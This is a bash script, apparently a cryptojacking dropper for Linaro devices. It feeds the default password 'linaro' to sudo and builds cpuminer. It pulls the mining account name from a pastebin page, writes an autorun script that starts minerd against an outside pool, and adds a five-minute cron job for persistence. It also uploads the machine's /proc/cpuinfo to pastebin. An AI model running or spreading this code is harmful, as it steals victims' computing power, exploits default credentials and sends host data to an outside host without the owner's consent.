#!/bin/bash
echo linaro | sudo -S apt-get -y install autoconf libcurl3-dev pkg-config git pastebinit
git clone https://github.com/pooler/cpuminer
cd ~/cpuminer
./autogen.sh
./configure CFLAGS="-O3"
make
wget http://pastebin.com/raw.php?i=CF7bUMVV
USER=`cat raw*`
if [ -a ~/autorun.sh ]
then
echo
else
echo "#!/bin/bash

if [ $(ps -e | grep minerd | wc -l) == '1' ]
then
 echo 1
else
 ~/cpuminer/minerd --url stratum+tcp://mine.pool-x.eu:9000/ --threads=4 --userpass $USER.1:x
 echo 0
fi
" > ~/autorun.sh
chmod +x ~/autorun.sh
crontab -l > /tmp/crontab.cr
echo '*/5 * * * * ~/autorun.sh' >> /tmp/crontab.cr
crontab /tmp/crontab.cr
echo kk
fi

echo "asgamx " >> /tmp/pref
cat /tmp/pref /proc/cpuinfo | pastebinit -b http://pastebin.com
